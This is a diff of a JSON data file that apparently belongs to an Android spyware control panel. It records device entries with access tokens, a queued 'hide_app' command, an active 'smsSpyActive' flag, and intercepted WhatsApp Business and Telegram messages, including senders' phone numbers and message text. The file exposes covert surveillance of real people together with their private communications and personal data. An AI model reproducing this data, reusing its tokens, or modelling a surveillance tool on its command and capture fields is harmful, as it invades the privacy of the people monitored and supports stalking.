@@ -166,15 +166,7 @@
     "ownerUsername": "GANANG",
     "token": "511c843889490f24a83fdf9ff1ebec0c",
     "lastSeen": 1775629505596,
-    "commandQueue": [
-      {
-        "type": "hide_app",
-        "payload": {
-          "hide": false
-        },
-        "sentAt": 1775629514778
-      }
-    ],
+    "commandQueue": [],
     "online": false,
     "connectedAt": "2026-04-08T06:21:32.558Z",
     "deviceInfo": {
@@ -311,7 +303,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775637050675,
+    "lastSeen": 1775637086814,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +319,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "🎥 Kumaha ieu? (0.05)",
+        "time": "08/04 15:31",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775637087440
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 857-8951-4723",
+        "content": "Kalo aja nanti gua mau buy tapi belom ada ubah jdi SV an aja dulu",
+        "time": "08/04 15:31",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775637087361
+      },
       {
         "appName": "Telegram",
         "sender": "ALL BUYYER GOJO HARIAN: Gok",
@@ -4310,22 +4318,6 @@
         "time": "08/04 14:40",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775634004029
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 838-1173-3694",
-        "content": "Tahu kon?",
-        "time": "08/04 14:39",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633989041
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 838-1173-3694",
-        "content": "Tahu kon?",
-        "time": "08/04 14:39",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633988955
       }
     ],
     "galleryPhotos": [],
